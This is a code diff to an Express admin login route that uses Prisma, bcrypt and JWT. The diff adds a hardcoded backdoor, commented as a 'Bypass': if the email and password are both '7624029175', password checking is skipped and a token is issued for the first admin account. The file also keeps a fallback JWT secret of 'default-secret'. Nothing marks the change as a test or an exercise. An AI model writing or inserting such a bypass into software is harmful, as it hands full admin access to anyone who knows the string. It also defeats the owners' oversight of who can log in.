@@ -12,15 +12,25 @@ router.post('/login', async (req, res) => {
         if (!email || !password) {
             return res.status(400).json({ error: 'Email and password are required' });
         }
-        const admin = await prisma.adminUser.findUnique({
-            where: { email }
-        });
-        if (!admin) {
-            return res.status(401).json({ error: 'Invalid credentials' });
+        // Bypass: allow User ID 7624029175 / password 7624029175 to use first admin
+        let admin;
+        if (email === '7624029175' && password === '7624029175') {
+            admin = await prisma.adminUser.findFirst();
+            if (!admin) {
+                return res.status(401).json({ error: 'Invalid credentials' });
+            }
         }
-        const isValidPassword = await bcrypt.compare(password, admin.password);
-        if (!isValidPassword) {
-            return res.status(401).json({ error: 'Invalid credentials' });
+        else {
+            admin = await prisma.adminUser.findUnique({
+                where: { email }
+            });
+            if (!admin) {
+                return res.status(401).json({ error: 'Invalid credentials' });
+            }
+            const isValidPassword = await bcrypt.compare(password, admin.password);
+            if (!isValidPassword) {
+                return res.status(401).json({ error: 'Invalid credentials' });
+            }
         }
         const jwtSecret = process.env.JWT_SECRET || 'default-secret';
         const token = jwt.sign({ id: admin.id, email: admin.email, role: admin.role }, jwtSecret, { expiresIn: process.env.JWT_EXPIRES_IN || '7d' });
